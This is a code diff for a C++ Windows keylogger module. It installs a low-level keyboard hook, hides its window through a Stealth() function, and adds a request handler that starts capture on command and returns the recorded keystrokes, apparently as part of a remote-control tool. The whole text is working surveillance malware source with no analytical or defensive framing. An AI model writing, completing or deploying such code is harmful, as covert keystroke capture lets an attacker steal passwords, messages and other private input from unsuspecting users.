@@ -16,8 +16,6 @@
 
 
 #if FORMAT == 0
-
-// Keyboard input map
 const std::map<int, std::string> keyname{
 	{VK_BACK, "[BACKSPACE]" },
 	{VK_RETURN,	"\n" },
@@ -59,10 +57,9 @@ KBDLLHOOKSTRUCT kbdStruct;
 int Save(int key_stroke);
 //std::ofstream output_file;
 bool KLG_Func::keylogging = false;
-bool released = false;
+
 std::vector<std::string> keylog;
-const std::chrono::seconds timeout(10);
-auto start = std::chrono::steady_clock::now();
+
 // This is the callback function. Consider it the event that is raised when, in this case,
 // a key is pressed.
 void ReleaseHook();
@@ -202,14 +199,36 @@ void Stealth()
 }
 
 
-std::shared_ptr<DataObj> KLG_Func::startKeylog()
+std::shared_ptr<DataObj> KLG_Func::HandleRequest(DataObj request)
 {
-	std::string res = "Start: ";
-	std::shared_ptr<DataObj> MES(new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res));
-	//const char* output_filename = "keylogger.log";
-	//std::cout << "Logging output to " << output_filename << std::endl;
-	//output_file.open(output_filename, std::ios_base::app);
+	std::shared_ptr<DataObj> response(new DataObj(utils::CurrentTime(), RESPONSE, KLG, CMD_TYPE, ""));
+	if (request.getDataType() != REQUEST || request.getFuncType() != KLG)
+	{
+		response->setData("MESSAGE PARAMETER ERRORS");
+		return response;
+	}
 
+	if (request.getCmdType() == START)
+	{
+		response->setData(this->startKeylog());
+		if (!response->getData_String().empty()) {
+			response->setCmdType(CmdType::DATA);
+		}
+	}
+	else
+	{
+		response->setData(this->stopKeylog());
+		if (!response->getData_String().empty()) {
+			response->setCmdType(CmdType::DATA);
+		}
+	}
+	return response;
+}
+
+std::string KLG_Func::startKeylog()
+{
+	std::string res = "";
+	
 	// visibility of window
 	Stealth();
 
@@ -220,25 +239,38 @@ std::shared_ptr<DataObj> KLG_Func::startKeylog()
 	
 	MSG msg;
 	
-	while (GetMessage(&msg, NULL, 0, 0) && !released)
-	{
+	auto start = std::chrono::steady_clock::now();  // Start the timer
+	const int maxDurationSeconds = 10;  // Maximum duration in seconds
 
-		if (std::chrono::steady_clock::now() - start > timeout) break;
+	while (true)
+	{
+		auto now = std::chrono::steady_clock::now();
+		auto duration = std::chrono::duration_cast<std::chrono::seconds>(now - start).count();
+
+		if (duration >= maxDurationSeconds)
+			break;  // Exit the loop if the maximum duration is reached
+		PeekMessage(&msg, NULL, 0, 0, PM_REMOVE);
+		//if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE))
+		//{
+		//	if (msg.message == WM_QUIT)
+		//		break;  // Exit the loop if a quit message is received
+
+		//	TranslateMessage(&msg);
+		//	DispatchMessage(&msg);
+		//}
 	}
 
 	for (std::string key : keylog)
 	{
 		res += key;
 	}
-	res += "!";
-	MES->setData(res);
-	return MES;
+	ReleaseHook();
+	return res;
 }
 
-std::shared_ptr<DataObj> KLG_Func::stopKeylog()
+std::string KLG_Func::stopKeylog()
 {
-	std::string res = "Stop";
-	std::shared_ptr<DataObj> MES(new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res));
+	std::string res = "";
 
 	if (keylogging)
 	{
@@ -248,8 +280,7 @@ std::shared_ptr<DataObj> KLG_Func::stopKeylog()
 		res = "Keylogging stopped";
 	}
 	else res = "Keylogging is not running";
-	MES->setData(res);
-	return MES;
+	return res;
 }
 
 
